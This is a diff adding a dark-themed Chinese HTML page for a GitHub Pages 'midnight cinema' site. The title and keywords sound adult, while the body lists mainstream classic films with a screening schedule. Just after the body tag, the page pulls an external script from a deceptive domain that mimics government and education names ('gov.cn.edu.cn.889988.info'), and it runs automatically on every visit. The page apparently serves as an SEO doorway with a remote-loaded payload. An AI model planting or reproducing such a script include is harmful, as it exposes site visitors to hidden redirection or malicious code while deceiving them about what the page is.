@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>成人午夜电影网 | 深夜专属影视剧场 · 高清经典影片在线观赏</title>
+<meta name="description" content="成人午夜电影网(chengrenwuyedianyingwang-zh.github.io)打造深夜专属影视剧场，汇集悬疑惊悚、经典文艺、午夜剧场等高清影片资源，沉浸式夜间观影氛围，陪伴每一个不眠之夜。">
+<meta name="keywords" content="成人午夜电影网,深夜影视剧场,午夜电影在线观看,经典文艺片,悬疑惊悚片,夜间观影,高清午夜剧场,经典老片珍藏">
+<link rel="canonical" href="https://chengrenwuyedianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#1a0e0a;--bg2:#241410;--card:#2c1913;--line:#4a2c20;
+  --ink:#f5e6d8;--muted:#b09888;--gold:#d4a056;--crimson:#c0392b;--crimson2:#e05a3a;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Georgia","Songti SC","SimSun","Noto Serif SC",serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;
+  background-image:radial-gradient(circle at 20% 10%,rgba(192,57,43,.12),transparent 40%),radial-gradient(circle at 85% 80%,rgba(212,160,86,.08),transparent 45%);
+  background-attachment:fixed;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.container{max-width:1160px;margin:0 auto;padding:0 24px}
+
+/* 顶部 */
+.topbar{background:rgba(20,10,6,.95);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:999}
+.topbar-in{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;flex-direction:column;line-height:1.1}
+.brand b{font-size:24px;letter-spacing:2px;color:#f0d5b5;font-weight:700}
+.brand small{font-size:11px;color:var(--muted);letter-spacing:4px;text-transform:uppercase;margin-top:3px}
+.navmenu{display:flex;gap:4px;align-items:center}
+.navmenu a{padding:10px 16px;font-size:15px;color:#e6d2bd;position:relative;transition:.3s;letter-spacing:.5px}
+.navmenu a::after{content:"";position:absolute;left:16px;right:16px;bottom:4px;height:1px;background:var(--gold);transform:scaleX(0);transition:.3s}
+.navmenu a:hover{color:var(--gold)}
+.navmenu a:hover::after{transform:scaleX(1)}
+.hamb{display:none;width:30px;height:22px;flex-direction:column;justify-content:space-between;cursor:pointer}
+.hamb span{height:2px;background:var(--gold);border-radius:2px;display:block}
+
+/* Banner */
+.banner{position:relative;padding:110px 0 90px;text-align:center;overflow:hidden}
+.banner::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.012) 3px,rgba(255,255,255,.012) 4px);z-index:1}
+.banner-in{position:relative;z-index:2}
+.banner .tagline{font-size:12px;letter-spacing:8px;color:var(--gold);text-transform:uppercase;margin-bottom:24px;display:inline-block;border:1px solid rgba(212,160,86,.4);padding:6px 18px;border-radius:30px}
+.banner h1{font-size:52px;font-weight:700;line-height:1.3;margin-bottom:22px;color:#f7e3cf}
+.banner h1 span{color:var(--crimson2);font-style:italic}
+.banner p{font-size:18px;color:var(--muted);max-width:620px;margin:0 auto 36px;font-style:italic}
+.banner-actions{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn1{background:var(--crimson);color:#fff;padding:14px 34px;border:none;border-radius:2px;font-size:16px;cursor:pointer;letter-spacing:2px;transition:.3s;font-family:inherit}
+.btn1:hover{background:var(--crimson2);transform:translateY(-2px)}
+.btn2{background:transparent;color:var(--gold);padding:13px 34px;border:1px solid var(--gold);border-radius:2px;font-size:16px;cursor:pointer;letter-spacing:2px;transition:.3s;font-family:inherit}
+.btn2:hover{background:var(--gold);color:#1a0e0a}
+
+/* 数据统计条 */
+.stats{background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:26px 0}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;text-align:center}
+.stat-item{border-right:1px solid var(--line)}
+.stat-item:last-child{border-right:none}
+.stat-item strong{display:block;font-size:32px;color:var(--gold);font-weight:700}
+.stat-item span{font-size:13px;color:var(--muted);letter-spacing:1px}
+
+/* 通用区块 */
+section{padding:80px 0}
+.sec-title{text-align:center;margin-bottom:48px}
+.sec-title .en{font-size:12px;letter-spacing:6px;color:var(--crimson2);text-transform:uppercase;display:block;margin-bottom:8px}
+.sec-title h2{font-size:30px;font-weight:700;color:#f0d5b5;letter-spacing:1px}
+.sec-title h2 em{font-style:italic;color:var(--gold)}
+.sec-title p{color:var(--muted);font-size:15px;margin-top:10px;font-style:italic}
+
+/* 剧场卡片（大图+文字） */
+.theater{display:grid;grid-template-columns:repeat(2,1fr);gap:30px}
+.theater-card{background:var(--card);border:1px solid var(--line);display:flex;flex-direction:column;transition:.4s}
+.theater-card:hover{border-color:var(--crimson);transform:translateY(-4px)}
+.thumb{height:220px;display:flex;align-items:center;justify-content:center;font-size:60px;position:relative;overflow:hidden}
+.thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.6))}
+.thumb .badge{position:absolute;top:14px;left:14px;z-index:2;background:var(--crimson);color:#fff;font-size:11px;padding:3px 10px;letter-spacing:1px;font-family:sans-serif}
+.thumb .time{position:absolute;bottom:14px;right:14px;z-index:2;color:#fff;font-size:12px;font-family:sans-serif}
+.t-body{padding:24px}
+.t-body h3{font-size:21px;color:#f0d5b5;margin-bottom:10px;font-weight:700}
+.t-body p{font-size:14px;color:var(--muted);margin-bottom:14px}
+.t-meta{display:flex;gap:14px;flex-wrap:wrap;font-size:12px;color:var(--gold);font-family:sans-serif}
+.t-meta span{border:1px solid rgba(212,160,86,.3);padding:2px 10px;border-radius:20px}
+
+/* 片单列表 */
+.playlist{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.film{background:var(--card);border:1px solid var(--line);padding:0;transition:.3s;cursor:pointer}
+.film:hover{border-color:var(--gold)}
+.f-cover{height:180px;display:flex;align-items:center;justify-content:center;font-size:44px;position:relative}
+.f-cover .ep{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);color:var(--gold);font-size:11px;padding:2px 8px;font-family:sans-serif}
+.f-info{padding:18px}
+.f-info h4{font-size:17px;color:#f0d5b5;margin-bottom:6px}
+.f-info .ftype{font-size:12px;color:var(--crimson2);font-family:sans-serif;margin-bottom:6px}
+.f-info .fdesc{font-size:13px;color:var(--muted)}
+
+/* 时间轴 */
+.schedule{max-width:820px;margin:0 auto}
+.sched-row{display:grid;grid-template-columns:120px 1fr;gap:0;border-bottom:1px dashed var(--line);padding:20px 0;align-items:start}
+.sched-row:last-child{border-bottom:none}
+.sched-time{font-size:22px;color:var(--gold);font-weight:700;font-family:sans-serif}
+.sched-time small{display:block;font-size:11px;color:var(--muted);letter-spacing:2px;font-weight:400}
+.sched-info h4{font-size:18px;color:#f0d5b5;margin-bottom:6px}
+.sched-info p{font-size:14px;color:var(--muted)}
+.sched-info .tag{display:inline-block;font-size:11px;color:var(--crimson2);border:1px solid var(--crimson);padding:1px 8px;margin-left:8px;vertical-align:middle;font-family:sans-serif}
+
+/* 关于 */
+.about{background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.about-wrap{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.about-txt h3{font-size:26px;color:#f0d5b5;margin-bottom:20px}
+.about-txt p{color:var(--muted);margin-bottom:14px;font-size:15px;text-align:justify}
+.about-txt .site-url{color:var(--gold);font-style:italic}
+.about-feat{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.feat{border:1px solid var(--line);padding:24px;background:var(--card);transition:.3s}
+.feat:hover{border-color:var(--gold)}
+.feat .fi{font-size:28px;margin-bottom:10px;display:block}
+.feat h4{font-size:16px;color:#f0d5b5;margin-bottom:6px}
+.feat p{font-size:13px;color:var(--muted)}
+
+/* 页脚 */
+footer{background:#120805;padding:56px 0 28px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;margin-bottom:36px}
+.foot-col h4{font-size:15px;color:var(--gold);margin-bottom:16px;letter-spacing:1px}
+.foot-col a{display:block;color:var(--muted);font-size:14px;padding:5px 0;transition:.2s;font-family:sans-serif}
+.foot-col a:hover{color:var(--crimson2)}
+.foot-brand p{color:var(--muted);font-size:14px;margin-top:10px}
+.foot-bottom{text-align:center;border-top:1px solid var(--line);padding-top:22px;color:#6b5344;font-size:12px;font-family:sans-serif}
+
+/* 响应式 */
+@media(max-width:900px){
+  .banner{padding:70px 0 60px}
+  .banner h1{font-size:34px}
+  .banner p{font-size:16px}
+  .stats-grid{grid-template-columns:repeat(2,1fr);gap:16px}
+  .stat-item:nth-child(2){border-right:none}
+  .theater,section{padding:56px 0}
+  .playlist{grid-template-columns:repeat(2,1fr)}
+  .about-wrap{grid-template-columns:1fr;gap:36px}
+  .sec-title h2{font-size:24px}
+}
+@media(max-width:620px){
+  .hamb{display:flex}
+  .navmenu{position:absolute;top:72px;left:0;right:0;flex-direction:column;background:#150a06;border:1px solid var(--line);padding:12px;display:none}
+  .navmenu.active{display:flex}
+  .navmenu a{width:100%;text-align:center;padding:14px}
+  .banner h1{font-size:27px}
+  .banner .tagline{font-size:10px;letter-spacing:4px}
+  .theater{grid-template-columns:1fr}
+  .playlist{grid-template-columns:1fr}
+  .sched-row{grid-template-columns:1fr;gap:6px}
+  .about-feat{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="container topbar-in">
+    <div class="brand"><b>成人午夜电影网</b><small>Midnight Cinema</small></div>
+    <nav class="navmenu" id="navmenu">
+      <a href="#home">午夜首页</a>
+      <a href="#theater">午夜剧场</a>
+      <a href="#films">经典片单</a>
+      <a href="#schedule">放映时刻</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="hamb" id="hamb"><span></span><span></span><span></span></div>
+  </div>
+</div>
+
+<!-- Banner -->
+<section class="banner" id="home">
+  <div class="container banner-in">
+    <span class="tagline">Midnight · Cinema · Hour</span>
+    <h1>当城市沉睡时<br><span>好戏</span> 才刚刚开场</h1>
+    <p>成人午夜电影网 · 为每一个不眠之夜准备的深夜专属影视剧场</p>
+    <div class="banner-actions">
+      <a href="#theater"><button class="btn1">进入剧场</button></a>
+      <a href="#schedule"><button class="btn2">查看排片</button></a>
+    </div>
+  </div>
+</section>
+
+<!-- 数据统计 -->
+<div class="stats">
+  <div class="container stats-grid">
+    <div class="stat-item"><strong>5000+</strong><span>珍藏片源</span></div>
+    <div class="stat-item"><strong>24H</strong><span>全天候放映</span></div>
+    <div class="stat-item"><strong>9.2</strong><span>综合评分</span></div>
+    <div class="stat-item"><strong>每日</strong><span>更新推荐</span></div>
+  </div>
+</div>
+
+<!-- 午夜剧场 -->
+<section id="theater">
+  <div class="container">
+    <div class="sec-title">
+      <span class="en">Featured Theater</span>
+      <h2>午夜 <em>剧场</em></h2>
+      <p>精选悬疑、惊悚、文艺佳作，陪你度过深夜时光</p>
+    </div>
+    <div class="theater">
+      <div class="theater-card">
+        <div class="thumb" style="background:linear-gradient(135deg,#2c1810,#5a2010)">🕯️<span class="badge">独家剧场</span><span class="time">22:00 开映</span></div>
+        <div class="t-body">
+          <h3>沉默的羔羊</h3>
+          <p>经典心理惊悚巅峰之作，汉尼拔博士与 FBI 见习特工之间的致命博弈，每一个深夜都值得重温的悬疑教科书。</p>
+          <div class="t-meta"><span>惊悚</span><span>犯罪</span><span>1080P</span></div>
+        </div>
+      </div>
+      <div class="theater-card">
+        <div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#16213e)">🌙<span class="badge">经典回顾</span><span class="time">23:30 开映</span></div>
+        <div class="t-body">
+          <h3>午夜巴黎</h3>
+          <p>伍迪·艾伦写给巴黎的一封情书，时空交错的浪漫文艺小品，适合在深夜独自品味的生活哲理。</p>
+          <div class="t-meta"><span>文艺</span><span>爱情</span><span>1080P</span></div>
+        </div>
+      </div>
+      <div class="theater-card">
+        <div class="thumb" style="background:linear-gradient(135deg,#0f2027,#203a43)">🔍<span class="badge">悬疑专场</span><span class="time">00:30 开映</span></div>
+        <div class="t-body">
+          <h3>禁闭岛</h3>
+          <p>斯科塞斯与莱昂纳多联手打造的心理悬疑巨作，层层反转的叙事结构，让人在真相揭晓那一刻彻夜难眠。</p>
+          <div class="t-meta"><span>悬疑</span><span>心理</span><span>1080P</span></div>
+        </div>
+      </div>
+      <div class="theater-card">
+        <div class="thumb" style="background:linear-gradient(135deg,#232526,#414345)">🎭<span class="badge">深夜独播</span><span class="time">01:30 开映</span></div>
+        <div class="t-body">
+          <h3>搏击俱乐部</h3>
+          <p>大卫·芬奇的 cult 经典，关于人格分裂与消费主义的黑色寓言，每一帧都藏着令人细思极恐的隐喻。</p>
+          <div class="t-meta"><span>剧情</span><span>心理</span><span>1080P</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 经典片单 -->
+<section id="films" style="background:var(--bg2)">
+  <div class="container">
+    <div class="sec-title">
+      <span class="en">Classic Collection</span>
+      <h2>经典 <em>片单</em></h2>
+      <p>那些年我们熬夜刷过的神作，一部都不能错过</p>
+    </div>
+    <div class="playlist">
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#3a1c0d,#7a3410)">🎬<span class="ep">EP.01</span></div>
+        <div class="f-info"><div class="ftype">心理惊悚</div><h4>盗梦空间</h4><p class="fdesc">诺兰打造的梦境迷宫，多层叙事结构令人拍案叫绝，凌晨三点看完仍然清醒。</p></div>
+      </div>
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#1b2845,#274060)">🌃<span class="ep">EP.02</span></div>
+        <div class="f-info"><div class="ftype">黑色电影</div><h4>七宗罪</h4><p class="fdesc">七桩以天主教七宗罪为原型的连环杀人案，阴郁压抑的都市氛围令人窒息。</p></div>
+      </div>
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#2d1b4e,#4a2c7a)">🎻<span class="ep">EP.03</span></div>
+        <div class="f-info"><div class="ftype">悬疑剧情</div><h4>记忆碎片</h4><p class="fdesc">倒叙与正叙交织的非线性叙事，失忆男子寻找真相的烧脑之旅，深夜必看佳作。</p></div>
+      </div>
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#4a1942,#7a2e63)">🥀<span class="ep">EP.04</span></div>
+        <div class="f-info"><div class="ftype">文艺爱情</div><h4>花样年华</h4><p class="fdesc">王家卫镜头下的六十年代香港，旗袍与雨巷里的隐忍情愫，美得让人心碎。</p></div>
+      </div>
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#0f0c29,#302b63)">🚢<span class="ep">EP.05</span></div>
+        <div class="f-info"><div class="ftype">犯罪剧情</div><h4>美国往事</h4><p class="fdesc">一部关于友谊、背叛与岁月的史诗，漫长而细腻的叙事适合安静的深夜独自咀嚼。</p></div>
+      </div>
+      <div class="film">
+        <div class="f-cover" style="background:linear-gradient(135deg,#134e5e,#71b280)">🎹<span class="ep">EP.06</span></div>
+        <div class="f-info"><div class="ftype">治愈文艺</div><h4>海上钢琴师</h4><p class="fdesc">一生未曾踏上陆地的钢琴天才，孤独而浪漫的灵魂故事，温柔了无数个夜晚。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 放映时刻 -->
+<section id="schedule">
+  <div class="container">
+    <div class="sec-title">
+      <span class="en">Midnight Schedule</span>
+      <h2>午夜 <em>放映时刻</em></h2>
+      <p>每晚准时开映，跟着排片表开启你的深夜观影计划</p>
+    </div>
+    <div class="schedule">
+      <div class="sched-row">
+        <div class="sched-time">22:00<small>OCT 05</small></div>
+        <div class="sched-info"><h4>沉默的羔羊 <span class="tag">独家</span></h4><p>经典心理惊悚，FBI 特工与高智商精神病学家的智力角逐，万圣节前夕最应景的深夜片单。</p></div>
+      </div>
+      <div class="sched-row">
+        <div class="sched-time">23:00<small>OCT 05</small></div>
+        <div class="sched-info"><h4>禁闭岛 <span class="tag">悬疑</span></h4><p>暴风雨中的孤岛精神病院，层层剥开的真相让人在凌晨时分后背发凉。</p></div>
+      </div>
+      <div class="sched-row">
+        <div class="sched-time">00:00<small>OCT 06</small></div>
+        <div class="sched-info"><h4>午夜巴黎 <span class="tag">文艺</span></h4><p>午夜钟声敲响，穿越回黄金年代的巴黎，与海明威、毕加索共度奇妙之夜。</p></div>
+      </div>
+      <div class="sched-row">
+        <div class="sched-time">01:30<small>OCT 06</small></div>
+        <div class="sched-info"><h4>搏击俱乐部 <span class="tag">cult</span></h4><p>失眠男人的深夜地下世界，颠覆三观的结局注定让你彻夜难眠。</p></div>
+      </div>
+      <div class="sched-row">
+        <div class="sched-time">02:30<small>OCT 06</small></div>
+        <div class="sched-info"><h4>花样年华 <span class="tag">经典</span></h4><p>夜深人静时的怀旧时光，张曼玉的 23 套旗袍诉说着那段欲言又止的感情。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+  <div class="container">
+    <div class="sec-title">
+      <span class="en">About Us</span>
+      <h2>关于 <em>本站</em></h2>
+    </div>
+    <div class="about-wrap">
+      <div class="about-txt">
+        <h3>为深夜而生的影视剧场</h3>
+        <p>成人午夜电影网（chengrenwuyedianyingwang-zh.github.io）是一个专注深夜观影氛围的影视分享平台，我们精选悬疑、惊悚、文艺、经典老片等适合夜间品味的影视作品。</p>
+        <p>从 22:00 到凌晨，每一个时段都有精心编排的放映排片，让失眠的夜晚不再漫长，让好电影在深夜发光。</p>
+        <p>访问地址：<a href="https://chengrenwuyedianyingwang-zh.github.io/" class="site-url">https://chengrenwuyedianyingwang-zh.github.io/</a></p>
+      </div>
+      <div class="about-feat">
+        <div class="feat"><span class="fi">🎬</span><h4>精选片源</h4><p>严选高分佳作，覆盖悬疑、惊悚、文艺、经典等多类型。</p></div>
+        <div class="feat"><span class="fi">🌙</span><h4>深夜氛围</h4><p>专为夜间观影设计的沉浸式浏览体验与排片节奏。</p></div>
+        <div class="feat"><span class="fi">📅</span><h4>每日更新</h4><p>每日精选推荐，持续扩充珍藏片单，常看常新。</p></div>
+        <div class="feat"><span class="fi">🖥️</span><h4>全端适配</h4><p>手机、平板、电脑多端自适应，随时随地沉浸观影。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-col foot-brand">
+        <h4 style="font-size:18px">成人午夜电影网</h4>
+        <p>为每一个不眠之夜准备的深夜专属影视剧场，陪伴你度过每一个安静的深夜。</p>
+      </div>
+      <div class="foot-col">
+        <h4>剧场导航</h4>
+        <a href="#theater">午夜剧场</a>
+        <a href="#films">经典片单</a>
+        <a href="#schedule">放映时刻</a>
+        <a href="#">高分推荐</a>
+      </div>
+      <div class="foot-col">
+        <h4>影片类型</h4>
+        <a href="#">心理惊悚</a>
+        <a href="#">悬疑推理</a>
+        <a href="#">文艺经典</a>
+        <a href="#">黑色电影</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于本站</h4>
+        <a href="#about">关于我们</a>
+        <a href="#">免责声明</a>
+        <a href="#">投稿合作</a>
+        <a href="#">联系方式</a>
+      </div>
+    </div>
+    <div class="foot-bottom">© 2026 成人午夜电影网 chengrenwuyedianyingwang-zh.github.io · 本站仅提供影视信息分享服务，所有资源均来源于网络</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById("hamb").addEventListener("click",function(){
+  document.getElementById("navmenu").classList.toggle("active");
+});
+document.querySelectorAll(".navmenu a").forEach(function(a){
+  a.addEventListener("click",function(){document.getElementById("navmenu").classList.remove("active");});
+});
+</script>
+</body>
+</html>
